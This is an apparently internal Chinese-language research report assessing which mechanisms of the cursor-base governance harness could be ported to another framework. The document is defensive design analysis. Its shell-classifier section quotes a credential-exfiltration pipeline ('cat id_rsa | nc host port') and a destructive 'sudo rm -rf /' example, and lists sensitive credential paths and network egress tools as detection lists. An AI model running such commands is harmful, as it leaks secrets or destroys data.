# cursor-base 增量机制报告（相对 dsh 基线 + zcode v1.0/v1.1 计划）

> researcher 产出 · 2026-09-01。研究对象 `/home/z00632348/code/cursor-base`（只读，未改动任何文件；本报告写在 zcode-base `.zcode/state/research/`，非仓内受管文件）。
> 基线 = `.zbase/research/dsh-base-mechanisms.md`（dsh 全部机制）∪ `zcode-base/DEV-PLAN.md` Phase 1-8（v1.0 自举 + v1.1 dsh 吸收批次 A/B/C）。**只报基线未覆盖的增量**；同族机制（catalog/impact/gate/哈希链/五性反证/arch/adr/fitness/manifest/context-pack/waiver 基本字段/risk 大框架/retention 存在性/gate-audit/recap 等）不再赘述。
> 引擎规模：`src/harness.mts` 5860 行 TypeScript（编译产物 `.cursor/runtime/harness.mjs` 5146 行/220KB 入仓）+ `tests/harness.test.mjs` 3138 行。**依赖情况**：package.json 仅 devDependencies（typescript ^5.9、@types/node ^22，package-lock 50 行），运行时零依赖 Node≥20——与 dsh/zcode 同为运行时零依赖，开发期引入 TS 工具链是其独有选择。
> 下文行号均相对 cursor-base 仓库根；`src/harness.mts` 与编译产物 `.cursor/runtime/harness.mjs` 内容对应（runtime-sync 校验字节一致）。
> **条目顺序按主题分组，非优先级排序**（排序是主 Agent 的活）。

---

## 一、通用引擎增量（zcode v2.0 可直接评估吸收）

### 1. `withStateLock` 并发状态锁

**目的**：多个 hook 进程并发运行，各自对共享状态文件做读-改-写；无锁则后写者静默丢弃先写者记录的干预/证据。

**实现摘要**（`src/harness.mts:479-532`）：`locks/<name>.lock` 以 `writeFileSync(flag:"wx")` 独占创建；锁内含 token/pid/created_at。等待方 busy-wait 25ms 自旋（注释：hook 短命，不值引入 sleep 依赖），超时上限 `LOCK_WAIT_MS=10s` 抛错；锁龄超 `LOCK_STALE_MS=60s` 判死锁可抢占删除；释放时校验 token 是自己的才删。原子写 `writeJson`（:472-477）= tmp 文件 + rename。消费点：tasks / quality-ledger / quality.json / shell-log（每次 read-modify-write 全包锁）。配套纪律：**repo 级 git diff 之类的重计算放在锁外**（:2688-2693、:4964-4966 两处注释明确「持锁跑全仓 diff 会超过 stale 窗口导致双写都基于陈旧状态」）。

**规模**：~50 行核心 + 4 个消费点。

**移植成本**：**低**。纯 fs，零依赖；zcode hooks 同样是多进程并发（7 事件各自 spawn node）。

**价值**：高。zcode v1/v1.1 计划（DEV-PLAN Phase 2.x）无任何并发控制；哈希链账本被并发写坏 = 断链 = 全部回执作废，锁是账本可靠性的前置条件。「锁外计算、锁内提交」的两条注释教训值得连代码一起搬。

---

### 2. `redactSecrets` 证据/日志输出脱敏（宪法红线「PII/密钥不入日志」的机器执法）

**目的**：收据 summary、证据文件、hook 审计账本、shell-log 全都记录命令与输出——密钥会顺着这些留痕二次扩散。

**实现摘要**（`src/harness.mts:1486-1511`）：9 类正则替换：PEM 私钥块、ghp_/xox/sk-/AKIA token、`authorization|api-key|token|password|secret [=:]` 赋值形（空白限制防跨行吞噬）、大写环境变量形（`*_SECRET|*_TOKEN|*_KEY|*_PASSWORD=...`）、URL userinfo `scheme://user:pass@`、query 参数 `?token=...`。消费点：executeCheck 收据 summary、appendLedger 审计记录（:4766-4769，subject 与 reason 都先 redact 再 boundedHead(300)）、afterShellExecution shell-log（:4967）、fitness finding excerpt（:3867）。测试锚点 `tests/harness.test.mjs:321`（"evidence redaction covers the shapes credentials actually take"）。

**规模**：~25 行 + 5 个消费点。

**移植成本**：**低**。

**价值**：高。zcode 宪法红线写明「隐私数据不入日志、不入上下文包」，Phase 6.1 吸收的 dsh privacy-protected 只是「不可豁免」，都不是输出面脱敏；dsh 的 scan-secrets 扫的是**文件**，cursor 脱敏的是**引擎自己产生的留痕**——同一红线的两个不同执行面，互补而非重复。

---

### 3. task `known_hashes` 写前冲突检测（「保护现有改动」纪律的执法化）

**目的**：拦截写操作前判断「这个文件是我上次写的样子，还是被第三方改过」——agent 的编辑与别人的编辑可区分，才能安全地拦。

**实现摘要**（`src/harness.mts:2596-2633` + task start :2661-2681）：`task start` 时对 owned_paths 全部文件做哈希基线 `known_hashes`（同时记录 `preexisting_dirty`）；`preflightTaskWrite`（preToolUse hook 调用，:4885-4893）：文件存在但不在基线 → deny「Restart the task or escalate」；哈希 ≠ 基线 → deny「changed outside this task … Reconcile the conflict before writing again」；每次接受的写由 `recordTaskWrite`（afterFileEdit hook，:4958）更新基线。判定为「写」的标准：**不在 READ_ONLY_TOOLS 白名单上的工具一律按写处理**（:4886-4892 注释：枚举 writer 工具名会让未知新工具绕过并发守卫）。配套：sessionStart 写 `baseline.json`（:4895-4903），afterFileEdit 记 `preexisting_changed_paths`/`session_edited_files`（:4939-4957），区分「会话前已存在的脏」与「本会话的编辑」。

**规模**：~80 行 + 3 个 hook 接线。

**移植成本**：**低-中**。逻辑自足；成本在 ZCode hook 事件面能否拿到写前（PreToolUse 有）与写后（PostToolUse 有）的文件路径载荷。

**价值**：高。zcode 宪法核心纪律 2「保护现有改动：不覆盖、不丢弃用户与他人未提交的工作」目前只有条文；dsh 也无此机制（dsh task 是信封+结构化审查）。这是把纪律变成机器判定的最直接路径，且正好复用 zcode 已有的 task 模块（Phase 2.3）。

---

### 4. `adapters` 外部工具目录与一键接线

**目的**：八属性里 availability/performance（以及深度 security/privacy）没有外部工具就没有证据源；「哪些工具值得接、怎么接、装没装」需要一份可执行的清单而不是文档。

**实现摘要**（`src/harness.mts:3948-4013` + `harness/adapters.json` 117 行）：目录 11 条（semgrep/osv-scanner/trivy/gitleaks/syft/presidio/stryker/schemathesis/k6/checkov/oslo），每条 `id/attributes/class/executable/command/install/rationale/timeoutMs`——rationale 含弱点评述（如 presidio「官方文档自述找不到全部，当一层而非边界」）。`adapters list`：按属性过滤 + `available`（whichCommand 探 PATH，Windows 展开 PATHEXT）+ `wired`（verification-matrix 里有无）；`adapters add <id>`：把检查写进 verification-matrix.json，输出 next_step 提示「接线只是一半：模块认领才生效」。缺失可执行文件 → BLOCKED 永不 PASS。

**规模**：~65 行 + 117 行数据。

**移植成本**：**低**（whichCommand zcode 需要的话连 PATHEXT 细节一起搬）。

**价值**：中-高。zcode 八属性六档（Phase 8.1）落地后，availability/performance 两属性若无 k6/SLO 类检查可认领，将全是接线缺陷；这份目录 + 接线命令是属性体系的证据供给侧。dsh 完全没有外部工具层（fitness 内建规则自足为限）。

---

### 5. runtime 类检查的时间窗绑定（`runtimeValidityHours`）

**目的**：负载测试/SLO 探针度量的是部署物，diff hash 描述不了它；强行绑 diff 会让这类证据要么永远 MISSING 要么被误当工作区证据。

**实现摘要**：catalog 字段 `runtimeValidityHours`（默认 24h，`src/harness.mts:101-102、1851-1853`）；assessQuality 对 `class === "runtime"` 的检查改按时间窗匹配（:1859-1867），binding 标注 `time-window-<n>h`「never mistaken for evidence about the code currently in the working tree」（:1870、:1893）。docs/QUALITY-ATTRIBUTES.md:57-62 + ADR-0001 Consequences 段为设计论述。

**规模**：~20 行判定 + 词汇标注。

**移植成本**：**低**。

**价值**：中。zcode/dsh 的回执全部绑 diffHash，deployer 三件套核验（产物时间戳/健康端点/live 冒烟）恰好是 runtime 证据——zcode v2.0 引入它可让部署核验产物进账本而不污染 diff 绑定语义。

---

### 6. `plan_sha256` 计划绑定（比 diff 绑定更细的失效面）

**目的**：改了模块认领或检查选择，旧证据描述的就是「另一个选择」——仅绑 diff 不够。

**实现摘要**（`src/harness.mts:1859-1867`）：回执含 `plan_sha256`（计划的选择集合哈希），assessQuality 匹配时强制相等（runtime 类豁免）；注释「The plan hash is enforced, not merely recorded」。riskChecks 累积层级（high ⊇ medium ⊇ low）+ task risk 也进 plan hash（progress.md Decisions 2026-08-07：「raising declared risk could then remove evidence」）。测试 :375「adding a check invalidates evidence gathered under the previous plan」。

**规模**：~15 行 + plan 构建处。

**移植成本**：**低**。

**价值**：中。zcode gate 计划（Phase 2.3）绑 diffHash；补 plan 绑定可堵「收窄计划复用旧回执」的洞。

---

### 7. FAIL-streak 根因重定向

**目的**：把「同一检查连续失败还反复重跑」从运动变回诊断——重试不是验证。

**实现摘要**：`consecutiveFailures`（`src/harness.mts:1830-1843`）；assessQuality 对 FAIL 项在 streak ≥3（FAIL_STREAK_THRESHOLD）时改写 reason（:1896-1905）：「Stop re-running it and follow root-cause-debugging: reproduce, isolate the first bad state, then fix」；riskScan 同信号独立报出（:3303-3319）「Stop re-running it; diagnose the root cause first」。docs/OPERATIONS.md:45-46 与教训 long-batch 同源。

**规模**：~35 行。

**移植成本**：**低**（zcode 已有账本，纯派生）。

**价值**：中。教训「连续失败 3 次是诊断问题不是重试问题」的引擎化，与 zcode 证据优先铁律同向。

---

### 8. feedback 教训库引擎化（lint + 毕业候选 + 「毕业优先可执行检查」）

**目的**：教训是评审可读的文件而非数据库；契约破坏（错 frontmatter/重复 id）与「复发 3 次未毕业」要机器发现。

**实现摘要**：`feedbackLessons`（`src/harness.mts:3542-3580`）解析 `docs/feedback/*.md` frontmatter（id=文件名、occurrences 正整数、graduated bool、# 标题）；`feedback lint`（:3586-3602）exit 1；`feedback list`（:3604-3617）报毕业候选（occurrences ≥3 且未毕业）；riskScan 单列 `feedback-graduation` finding（:3370-3379）；validate 把坏教训当 error（:5315-5318）；自举：verification-matrix 有 `feedback-lint` check（harness/verification-matrix.json:10-17）。契约细节（docs/feedback/README.md）：复发时**递增 occurrences 更新 last_seen 而非写重复文件**；毕业=提升为「被执法的东西」（rules 条目/skill 步骤/fitness 规则/检查）且**须用户确认**，毕业后文件保留作「规则为何存在」的记录；**「Prefer graduating into an executable check over more always-applied prose. Instruction text costs context on every request; a check costs nothing until it fires」**；隐私边界：**安装器永不复制 docs/，教训可能引用内部事故，不随框架旅行**（README Privacy 段）。

**规模**：~100 行引擎 + 9 篇种子教训 + 2 个契约文件。

**移植成本**：**低**。zcode Phase 3.4 已计划 feedback INDEX+5 种子、evolution-engine skill 已有 occurrence≥3 毕业概念（prompt 级）；增量仅是把契约校验与毕业候选发现下沉引擎 + 采纳「毕业优先落为检查/命令而非规则文本」与「教训库不入安装面」两条立场。

**价值**：中。对已计划的 feedback 体系是便宜的引擎补强；「优先毕业成检查」一条对 zcode 宪法体量控制有直接影响。

---

### 9. 哈希链账本轮转 + anchor 携带

**目的**：append-only 账本无界增长会吃掉磁盘并拖慢每次审计。

**实现摘要**（`src/harness.mts:1685-1727`）：appendQualityLedger 内保留最新 500 条，`anchor` 记录**最后一个被丢弃条目的链值**，使保留的尾部仍可端到端验证（:1712-1716）；断链升级：pre-chaining 账本 `needsRebuild` 时从 anchor 重链旧证据而非丢弃（:1697-1708），verifyLedgerChain 对 legacy 账本报 `legacy:true`「下次 gate 升级」而非失败（:1445-1451）。hook 审计 ledger.jsonl 独立轮转（4MB → .1 保一代，:4734-4745）。

**规模**：~40 行。

**移植成本**：**低**。

**价值**：中。zcode 哈希链账本（Phase 2.3）与 gate-log 留痕均未计划轮转；长期使用的仓必然撞上无界增长。anchor 携带是轮转与防篡改并存的正确解法。

---

### 10. retention 的引用保护语义

**目的**：销毁历史是策略的职责，销毁「验证当下的能力」是缺陷。

**实现摘要**（`src/harness.mts:3428-3513`）：删除前构造 protectedPaths = **当前 diff 回执引用的证据** + **每 check 最新回执引用的证据**（:3435-3445）；策略在 catalog.retention（30 天/200 证据文件/50 context packs）；`--dry-run` 预览；quarantine 的 `*.corrupt-*` 取证文件永不动（:3511）。

**规模**：~85 行（zcode Phase 2.4 已有 retention 案位，补保护判定即可）。

**移植成本**：**低**。

**价值**：中。zcode retention 计划存在但 DEV-PLAN 未提引用保护；没有它，retention 可能删掉 receipt verify 正要核对的证据文件。

---

### 11. 损坏状态隔离（quarantine）+ hook 失败的 fail-visible 降级

**目的**：状态文件坏了不能让 hook 永久失败，也不能静默当无事发生。

**实现摘要**：`quarantineCorruptState`（`src/harness.mts:4808-4832`）把不可解析的 state 文件改名为 `<file>.corrupt-<ts>`（取证保留，riskScan 单列 finding :3340-3347）；hook 异常处理（:4779-4805）：**安全事件**（beforeShellExecution/beforeMCPExecution/beforeReadFile/preToolUse）先记账再抛错（fail-closed，注释：「crashing security hook 此前不留痕，在审计里读作 unexercised」）；**观察事件**降级输出明确写「Treat verification state as unknown until gate has been run again」——注释点名教训：「A silent `{}` here turned a broken gate into a silent pass」。输出次序纪律：决策 printJson 先于审计 appendLedger（:4833-4846，「不可写的状态目录不能丢弃带权限判定的输出」）。hooks.json 侧 SECURITY_EVENTS 必须 `failClosed:true` 且 validate 校验（:5264-5266）。

**规模**：~60 行。

**移植成本**：**低-中**（ZCode hooks 的失败语义取决于宿主；ZCode config 是否有 failClosed 等价字段需查证）。

**价值**：中。zcode ADR-0006 是「硬门禁+gate-log 留痕」，fail-visible 原则相同；增量是三条具体纪律：崩溃的安全 hook 也要留痕、降级输出不得字节等同「全验证通过」、决定先于审计落盘。

---

### 12. shell 语义解析器 + 管道级秘密外传检测（hook 命令判定升级路径）

**目的**：正则匹配原始命令串回答不了「哪个程序带哪些参数在跑」；凭证拦截还要跨管道段跟踪数据流。

**实现摘要**（`src/harness.mts:4156-4621`）：(a) `sensitivePath`（:4156-4172）：.env（example/sample/template 豁免）/pem/key/p12/jks/id_rsa/credentials.json/service-account.json/.netrc/.npmrc/.pypirc + .ssh/.aws/.azure/.gnupg/.kube/.docker 目录；反斜杠先折叠保证跨平台判定一致。(b) POSIX-ish tokenizer `parseShellCommand`（:4250-4342）：引号/受控转义（仅 shell 可转义字符，注释：把 Windows 路径分隔符当转义曾把 `C:\Users\me\.ssh\id_rsa` 变成认不出的名字放过凭证读取）/管道/分号/&&/|| 切段/`$(...)` 与反引号标 dynamic。(c) `COMMAND_WRAPPERS`（:4201-4214）穿透 sudo/timeout/nice/env 等（「`sudo rm -rf /` 不能只被看成 sudo 调用」）。(d) `classifySecretExposure`（:4517-4557）：**跨管道段跟踪**——`cat id_rsa | nc host port` 中任一段碰敏感路径 + 后续段是 `EGRESS_COMMANDS`（curl/wget/scp/rsync/ssh/nc/telnet 等 13 个）→ deny 外传；本地读凭证 → ask。(e) 语义层与 legacy 正则层（deny/ask 模式表 :4574-4617）**取 strictest 合并**。(f) MCP 决策 mcpDecision（:4623-4665）：deny 只给「工具名本身声明破坏性」（delete/destroy/drop/purge）与「结构化字段同时声明 prod 环境 + 突变操作」；参数字段级匹配防误伤（注释：只读查询文本恰好含 production+update 不是威胁）。 <!-- scan-instructions:ignore -->

**规模**：~450 行 + 测试 ~200 行（tests :133-330 攻击面命名，含「全局选项分隔子命令的破坏性 git 命令仍被拦」:172）。

**移植成本**：**中**。自足无宿主耦合，可直接服务 zcode Phase 2.5 hook 的 PreToolUse 命令判定；成本在移植后要建攻击面测试组。

**价值**：高（有前提）。前提：zcode v2.0 hooks 的命令判定若沿用正则黑名单，这就是现成的升级实现；管道外传跟踪与 wrapper 穿透是 dsh/zcode 基线都没有的能力。若 ZCode 宿主已在 tool 层做等价 shell 解析则降为中低。

---

### 13. waiver 契约增补：`Compensation` 与 `Approval` 字段

**目的**：豁免不止要过期，还要回答「补偿了什么」「谁在哪批的」。

**实现摘要**（docs/GOVERNANCE.md:21-32 八字段契约；PROTOCOLS.md:64-71）：在 zcode/dsh 共有的 Owner/Reason/Scope/Expiry/Binding 之外加 `Compensation`（更窄的证据或后续动作）与 `Approval`（审批发生处——message/review/ticket，「an audit record, not an identity proof」）。引擎侧约束同族已覆盖（FAIL 永不可豁免/security class 拒绝/critical tier 拒绝/dies with the diff）。

**规模**：模板+校验 ~10 行。

**移植成本**：**低**（对 Phase 2.3 waiver 模板加两字段）。

**价值**：低-中。字段便宜，语义与 zcode「豁免可见于回执」完全兼容；Approval 让豁免从「带过期的借条」变成「带审计链的借条」。

---

### 14. install 的 upgrade/uninstall 三方合并 + `safeManagedPath` 反穿越

**目的**：升级不能把用户改过的文件冲掉，也不能留下新版已删除的旧文件；install manifest 是不可信输入，路径必须防穿越。

**实现摘要**（`src/harness.mts:942-1150`）：(a) `safeManagedPath`（:942-986）：拒绝对路径/盘符/UNC/`..`/空段，**逐段 lstat+realpath 校验**（悬空 symlink 报错、逐段解析后必须仍在目标内）。(b) `installLike`（:1063-1125）：`safeToReplace = 现哈希 == 旧 manifest 哈希`（本地没改过才直接覆盖；本地改过 → `.cursor-harness-new` 旁路，旁路名冲突再加哈希+时间戳唯一化 :1035-1055）；(c) `upgrade`：旧 manifest 有而新 manifest 无的文件——未改则 `remove-obsolete` 删除、改过则 `preserve-obsolete`；(d) `uninstall`：只删未修改的受管文件；(e) `assertSafeTarget`（:927-935）拒文件系统根与家目录。

**规模**：~200 行。

**移植成本**：**中-低**（对 Phase 7.5 install 增强的追加项；dsh 增量已含旁路/LF/verify，缺三方判定、upgrade/uninstall 与 symlink 逐段校验）。

**价值**：中。zcode 面向多仓安装（`--targets-from`），升级路径（v1.0→v1.1→v2.0）必然发生；「用户改没改过」的三方判定比 dsh 的「内容不一致就旁路」少一档误伤。

---

### 15. 性能锚点测试（生成大仓定基线）

**目的**：治理引擎自身的性能回归可测——大仓定位的框架不能自己先慢死。

**实现摘要**（progress.md Done 1.1.0 段）：「600k-line/30k-file/120-module generated repo pinned in tests; measured `catalog lint` ~3.2s, `affected` ~60ms」。tests/harness.test.mjs 内生成合成仓跑量测。配套实现细节：glob regex 缓存、`PROCESS_MAX_BUFFER = 256MB`（:570，注释：Node 默认 1MiB 管道上限会让大仓 `git ls-files` 截断且截断结果与「什么都没找到」不可区分）。

**规模**：测试内一个生成器 + 若干断言。

**移植成本**：**低**。

**价值**：中。zcode 定位 60W+ 行大仓，Phase 7.6 tests 重组时可一并落一个性能锚点测试；256MB maxBuffer 是立刻可抄的一行防坑。

---

### 16. 杂项小机制（低成本低争议）

| 机制 | 位置 | 一句话 |
|---|---|---|
| boundedHead/boundedText 头尾保向截断 | :1513-1526 | 命令截头（程序名是审计要的）、输出截尾（错误在尾）；zcode 各输出限长时可采 |
| gate PASS 静默输出 | :2106-2117 | 「绿输出不刷屏——把任务挤出上下文」；非 PASS 才附 reason/summary |
| gate --dry-run 绝不执行 | :2025-2041 | 「预览时执行 matrix 里的攻击者命令是最坏解读」+ executable_available 预检 |
| 空计划 → BLOCKED 非 PASS | :2043-2058 | 「计划选中零检查 = 什么都没验证」 |
| optional check FAIL 也不 acceptable | :1886-1890 | 曾使 gate 与 quality status 对同一证据不一致（教训痕迹） |
| quarantine/风险信号杂项 | riskScan :3350-3368 | 过期豁免逐条报 due；compaction-note 存在性提示 |
| `isDefaultBootstrapConfig` 警告 | :5181-5195、:5282-5286 | 「还在用 bootstrap 默认 catalog/matrix」警告——防装完忘了治理 |
| hooks.json 契约自证 | :5252-5267 | 每事件恰 1 hook + 必须调 checked-in runtime + 安全事件必须 failClosed；对 ADR-0006 doctor 校验的直接增强 |
| 状态目录自带 .gitignore | FRAMEWORK-MANIFEST :42-44 | `.cursor/harness-state/.gitignore` 内容 `*`（14 字节）随框架分发——运行态永不出现在 git 里，比文档约定硬 |
| service 日志轮转 | :2904-2916 | 5MB → .1 保一代，「轮转失败绝不丢当前行」 |

---

## 二、宿主专属机制（不适用 ZCode，列出备查）

| 机制 | 位置 | 不适用原因 / 可借鉴内核 |
|---|---|---|
| `.cursor/rules/*.mdc` frontmatter（description/alwaysApply/globs 按路径激活） | .cursor/rules/ 7 个 | ZCode 无 .mdc 等价物；「策略按路径窄 glob 激活而非常驻」的理念与 dsh 嵌套 AGENTS.md 互补，已在基线理念内 |
| `beforeShellExecution`/`beforeMCPExecution`/`beforeReadFile`/`preCompact`/`subagentStart`/`subagentStop` 六事件 | .cursor/hooks.json | ZCode 用户级 config 仅 7 事件（SessionStart/UserPromptSubmit/PreToolUse/PermissionRequest/PostToolUse/PostToolUseFailure/Stop）；**preCompact 抢救快照（:4991-5012，compaction 前落盘 binding/task/outstanding checks/changed paths——「compaction 是当前推理存在的最后一刻」）与 subagentStart 回执契约注入（:4978-4990）在 ZCode 无宿主事件承载，理念上分别对应 dsh invariants（已计划）与 zcode 派单契约（已有）** |
| `hooks.json` 的 `failClosed:true` 与 `loop_limit` 字段 | .cursor/hooks.json:8-9、60-67 | Cursor 宿主能力；ZCode 等价能力需查证宿主文档 |
| `cli.json` permissions allow/deny（Read(**)/Write(src/**)/deny .env、*.key、git push） | .cursor/cli.json | Cursor 宿主；ZCode 权限模型不同 | <!-- scan-instructions:ignore -->
| `sandbox.json` 网络策略（default deny + 拒内网段 127/8、10/8、172.16/12、192.168/16、**169.254.169.254 元数据端点**） | .cursor/sandbox.json | Cursor 宿主沙箱；若 ZCode 将来有沙箱配置，这份 deny-list（尤其云元数据 IP）是现成起点 |
| `worktrees.json`（setup-worktree 钩子命令表） | .cursor/worktrees.json | Cursor worktree 宿主特性 |
| `.cursorignore` / `.cursorindexingignore` | 仓根 | Cursor 索引控制 |
| TS 源 + 编译产物入仓 + `runtime-sync` 字节校验（:5086-5167：scratch 重编译逐文件 LF 归一比对 + 孤儿文件检测，「唯一不能通过直接改 runtime 满足的检查」） | src/ + CONTRIBUTING.md | zcode 宪法是零依赖纯 mjs 手写，无编译产物问题；**机制本身不值得移植**，但「单一事实源 + 产物可验证」思想在 zcode 将来出现任何生成物（如编译/打包产物）时可用 |

---

## 三、教训与设计立场（cursor 独有、比机制更值钱的部分）

### 3.1 与 zcode v1.1 计划直接对撞的设计立场：拒绝「全局 fast mode 窗口」

progress.md Decisions 2026-08-07 与 docs/CAPABILITY-MATRIX.md:12-17 两次明确记录：「**a global fast-mode bypass window**：per-check, diff-bound, expiring waivers give the same pressure valve without hiding which evidence was skipped, and **a mode flag is exactly the state that outlives its excuse**」。配套立场：豁免只适用于「未能运行的检查」（MISSING/BLOCKED/SKIPPED），**已执行的 FAIL 永不可豁免**（「a demonstrated defect deferred by paperwork is a false completion」）。——zcode Phase 6.2 已决定吸收 dsh fast 四条件（8h 封顶/reason 必填/allowFastSkip 预标记/DEBT 阻断）；cursor 的反方论点（模式旗标会活过它的借口；按检查豁免可审计到条目级）**呈报供主 Agent 裁决，本报告不裁**。两案并非全互斥：dsh 的 DEBT 阻断与 cursor 的「已执行 FAIL 不可豁免」可以叠乘。

### 3.2 顶层原则三条（CAPABILITY-MATRIX.md:19-23 + PROJECT-MEMORY.md）

1. **「同一模型二遍审查只是廉价补充，机器可执行证据才是承重检查」**——与 dsh 研究结论（review 循环收益量化）同向，但表述更尖锐。
2. **「新能力优先做成可执行检查或按需 skill，而非更多常驻文本」**（instruction text costs context on every request; a check costs nothing until it fires）——cursor 的 AGENTS.md 只有 873 字节（9 行），治理细节全部下沉 rules/skills/docs；zcode 宪法体量大，此立场是现成的体量控制标尺。
3. **「Decisions 是最常被跳过且最贵丢失的段」**（PROJECT-MEMORY.md:19-21：恢复的会话能从 Done 看见发生了什么，没有 Decisions 就不知道为什么，于是重讼已决问题或悄悄违反约束）——progress 段式建议加 **`## Not doing`（被考虑且被拒的提案+理由）**；cursor 自己的 Not doing 三条（拒 stale-memory Stop gate——「a gate must show what it caught first」；拒跨 worktree 路径租约；拒全局 fast mode）示范了该段的用法。注：拒 stale-memory Stop gate 与 dsh sync-check 装在 git pre-commit 不冲突（拒的是宿主会话 Stop 钩子阻断，装的执法缝在 git），但立场差异值得知道。

### 3.3 教训库中对 zcode 有独立价值、且 zcode 现有宪法/计划未覆盖的条目（docs/feedback/）

| 教训 | 内容要点 | zcode 现状 |
|---|---|---|
| config-defects-recur-across-sibling-instances | **配置形缺陷（超时/阈值/路径/模板）在同一设置的每个同类实例中复发；只修报告点=打地鼠。修完要搜全部同类实例（同事件族/同值/同模板），回执列出查过的每个实例** | 未覆盖；对 zcode 多模块引擎（19+ 模块）与多仓分发尤其对症 |
| long-batch-needs-watchdog-and-stop-loss | 长批量任务要 per-item 超时 + 把害群之马隔离而非杀整个 run + 廉价输入预检 + 止损信号（日志冻结超过最坏重试窗/输出计数不前进）。**「Watching a hung process is the most expensive form of hope」「process 还活着」不是进度** | 未覆盖；对 zcode 大仓 catalog/sync 等批处理命令有直接指导意义 |
| deploy-acceptance 验收细节 | 产物验收读**创建时间戳与镜像/build tag**——「uptime 读数在旧进程滞留时误导」；反向案例：incomplete 回复≠失败（部署其实成功） | 宪法已有三件套（时间戳/健康端点/live 冒烟）；增量仅「uptime 误导」与「自报两个方向都不可信」的细节 |
| destructive-ops-recheck-live-state | 删除生产资源基于早前快照+时间推断的事故；被拒调用已执行、重试造成重复 | 宪法纪律 8 已覆盖精神（「被拒/超时按可能已执行」）；佐证案例可入 zcode feedback 种子 |
| 已毕业 4 条（completion-claims / gates-earn-place / restart-storms / test-independence） | 每条注明「毕业到哪个机制」 | 机制层 zcode 已有等价物（证据五步/gate-audit/职责隔离）；service breaker 除外 |

### 3.4 其他经验沉淀

- **教训库不随 install 旅行**（README Privacy 段：installer never copies docs/）——zcode install 复制面设计（Phase 4.3/7.5）应采纳同一边界。
- **服务监督的自我限定**（progress.md Decisions：dev-time only、只杀自己启动的进程、production supervision belongs to the platform systemd/k8s）——若 zcode 评估 service 机制（见下），这组边界是前提。
- **自曝风险清单**（progress.md Risks 段）：arch-check 在 catalog 无 `provides` 时只见部分依赖图；import 提取 pattern-based（覆盖减少而非假违规）；hook 行为只在 CLI/测试层验证过、未在真实 Cursor 会话内跑过——zcode 做 hooks 同样要警惕「测试绿 ≠ 宿主内真跑」。

---

## 四、cursor-base 独有但价值存疑/按需的机制（允许否决）

### service 监督全链（start/stop/status/logs/supervise）

**目的/实现**（`src/harness.mts:2722-3278`，~550 行 + services.schema.json + service-operations skill）：开发期守护进程——指数退避重启（500ms→30s 封顶）、**重启风暴熔断**（600s 窗口内 >10 次重启 → crashed + exit 1 + 日志保留，注释即教训「 Unlimited restarts convert a diagnosable fault into a hidden one」）、健康探测（probeHealth :2922-2946，2xx/3xx 为健康，「alive but not serving is still an outage」）、**liveness 永远从 pid 现算不从 state 字段读**（synthesizeServiceStatus :2885-2902，掉电/kill -9 后 state 不会说谎）、killTree 进程组终止（POSIX detached / Windows taskkill /T）、liftoff 5 秒确认（:3144）。risk 集成 crashed/dead 两条 high finding。

**规模**：引擎 ~550 行 + 测试（SIGKILL 重启与熔断trip 的生命周期测试）+ skill/playbook。

**移植成本**：**中-高**（长驻进程、平台分支、生命周期测试）。

**价值判断**：**对 zcode 核心定位（治理脚手架）不建议整体移植，因为 dsh 当年明确拒绝 dev-service 监督、zcode DEV-PLAN 也无此案位，且 ZCode 会话通常短于服务生命周期，守护进程会话外存活本身引入新治理问题。可摘取的两个零件例外**：probeHealth（~25 行，deployer 三件套的「健康端点」判定可直接复用其超时/2xx-3xx 语义）与「重启风暴=非瞬时故障」的熔断立场（已沉淀为教训，见 3.3）。

### SECURITY.md / CONTRIBUTING.md

**事实**：SECURITY.md 419 字节（私密上报渠道、操作保证段=safety 不可豁免/waiver 契约引用/never auto push、支持版本行）；CONTRIBUTING.md 43 行（runtime source of truth 段、内容标准：POSIX 相对路径/.mdc 窄 globs/SKILL 简洁一层引用、PR 要求带 base commit+diff hash）。

**移植成本/价值**：zcode Phase 8.4 docs 四件套未含 SECURITY.md；**不值得单独移植**——其「操作保证」内容与 zcode 宪法重复，上报渠道段对内部框架无意义；若 zcode v2.0 将来开源，把「操作保证」八行并入 README 安全节即可。CONTRIBUTING 同理（zcode 有宪法+rules+docs 四件套承载同内容）。

### repo-map / `.env.example` 反例文档 / `assertSafeTarget` <!-- scan-instructions:ignore -->

repo-map（:1254-1267）仅打印 catalog 摘要，zcode catalog 命令已覆盖，不值得。`.env.example` 内容一句话「cursor-base requires no environment variables」——用反例文件占位防误配，便宜的小习惯。assertSafeTarget 已并入第 14 条。 <!-- scan-instructions:ignore -->

---

## 五、覆盖对照速查（cursor 机制 → 基线归属）

| cursor 机制 | 归属 |
|---|---|
| 八属性六档 + attributeReasons / TIER_ENFORCEMENT（critical 不可豁免） / 反证覆盖（FAIL 压倒 PASS） / 接线缺陷可见 | 基线已覆盖（dsh #18、zcode Phase 8.1/2.3） |
| catalog lint（unmapped/overlap/catch-all/ignored 需理由）/ globalPaths / shared 扇出 / layers+forbiddenDependencies / arch-check | 基线已覆盖（同族） |
| gate 四态/BLOCKED≠PASS/证据文件+哈希/quality verify 重核证据 | 基线已覆盖（dsh/zcode 同族） |
| 哈希链基本形态（chain=sha256(prev\0content)、删 FAIL 复活 PASS 可检出） | 基线已覆盖；**轮转+anchor+legacy 升级是增量（本报告 #9）** |
| waiver 基本字段/diff 绑定/过期/安全类拒绝 | 基线已覆盖；Compensation+Approval 是增量（#13） |
| task 信封/回执六字段/审批三档（Proceed/Announce/Stop ≈ LOW/MED/HIGH） | 基线已覆盖（zcode 宪法同文）；**known_hashes 写前预检是增量（#3）** |
| context-pack 预算/deny/symlink 不打包 | 基线已覆盖（数值参考：120k 总/20k 文件/40k diff/40 文件） |
| risk 扫描/retention 存在/gate-audit/manifest(LF 归一哈希)/doctor/fitness 内建规则/adr-check(Enforced-by+phant) | 基线已覆盖；risk 的 fail-streak/quarantine/毕业候选信号与 retention 引用保护是增量（#7/#10/#8/#11） |
| CI workflow（矩阵×typecheck→validate→doctor→test→manifest） | 基线已覆盖（dsh gate.yml 更全）；runtime-sync 步骤宿主专属 |
| install 旁路不覆盖/LF 归一/dry-run | 基线已覆盖（dsh #14）；三方合并 upgrade/uninstall/symlink 校验是增量（#14） |
| docs 四件套等价物（GOVERNANCE/OPERATIONS/PROTOCOLS/PROJECT-MEMORY/QUALITY-ATTRIBUTES/CAPABILITY-MATRIX/ADOPTION/ARCHITECTURE/LARGE-REPO-GUIDE） | 基线已覆盖（zcode Phase 8.4 + 既有 docs）；**PROJECT-MEMORY 的 Not doing 段与「Decisions 最贵」论述是增量（3.2）** |
